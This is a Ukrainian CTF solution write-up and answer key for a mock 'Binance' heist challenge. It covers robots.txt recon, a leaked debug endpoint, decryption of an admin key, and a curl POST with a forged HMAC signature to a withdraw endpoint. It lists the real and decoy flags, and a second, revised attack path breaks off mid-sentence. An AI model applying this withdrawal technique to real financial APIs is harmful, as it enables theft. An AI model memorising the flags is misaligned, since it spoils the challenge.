# Взлом Binance API (Writeup)

Це рішення для CTF "Operation Binance Heist".

1. **Розвідка (Recon):**
   Гравець відкриває `http://<server>:8011` (фрейм, що відображається після натискання СТАРТ).
   За стандартною практикою перевіряємо `robots.txt`:
   ```
   GET http://<server>:8011/api/robots.txt
   ```
   Знаходимо прихований шлях: `Disallow: /api/v3/internal/debug`

2. **Витік інформації (Information Disclosure):**
   Переходимо за знайденим маршрутом:
   ```
   GET http://<server>:8011/api/api/v3/internal/debug
   ```
   Отримуємо JSON з ключами:
   ```json
   {
       "encrypted_admin_key": "...",
       "target_cold_wallet": "CW-BTC-994100",
       "hint": "Find the AES master key in the frontend to decrypt the admin_key."
   }
   ```

3. **Підпис запиту:**
   Після розшифрування ключа створюємо HMAC-SHA256 від `CW-BTC-994100`, використовуючи `BNC-ADM-88912-SECRET` як ключ. Отриманий hex передаємо в `X-API-Signature`.

4. **Експлуатація (API Auth Bypass):**
   Використовуємо ключ, підпис та ID гаманця:
   ```bash
   curl -X POST http://<server>:8011/api/api/v3/wallet/withdraw \
        -H "X-API-Key: BNC-ADM-88912-SECRET" \
        -H "X-API-Signature: <HMAC_SHA256_HEX>" \
        -H "Content-Type: application/json" \
        -d '{"wallet_id": "CW-BTC-994100"}'
   ```

5. **Результат:**
   Сервер повертає прапор:
   `CTF{b1n4nc3_h4ck3d_c0ld_w4ll3t_st0l3n}`

## Пастки (не справжній шлях)

- У HTML є два ключі: `DEBUG_KEY` (справжній) і `BACKUP_KEY` (старий).
  `BACKUP_KEY` розшифровує лише `legacy_encrypted_admin_key`.
- `/api/v3/internal/legacy` віддає архівний debug-знімок. Ланцюжок
  `BACKUP_KEY` → `BNC-ADM-00000-LEGACY` → `/api/v3/wallet/withdraw_legacy`
  повертає `CTF{b1n4nc3_l3g4cy_d3bug_fl4g}` — табло його не приймає.
- `robots.txt` тепер показує і `debug`, і `legacy`. Справжній прапор дає лише
  `DEBUG_KEY` + `BNC-ADM-88912-SECRET` + `/api/v3/wallet/withdraw`.


Як тепер виглядає проходження (Attack Path):

    Recon: Гравець заходить на http://localhost:5000/. Дивиться вихідний код (Ctrl+U) і знаходить ключ Fernet у коментарі <!-- DEBUG_KEY: ... -->.

    Robots: Гравець йде в /robots.txt і знаходить /api/v3/internal/debug.

    Перша декриптовка (Fernet): Гравець бачить зашифрований admin_key. Він пише Python-скрипт із використанням cryptography.fernet, щоб розшифрувати його знайденим ключем і отримує BNC-ADM-88912-SECRET.

    Підпис: Гравець створює HMAC-SHA256 від ID гаманця, використовуючи розшифрований API-ключ.

    Експлуатація (Withdraw): Гравець робить POST-запит із правильними заголовками та JSON-тілом.

    Друга декриптовка (XOR): Сервер каже "Успіх", але віддає зашифрований прапор KDs2EgleBVse... і підказку, що це XOR із ключем kopiko.

    Отримання прапора: Гравець пише фінальний скрипт для декодування прапора: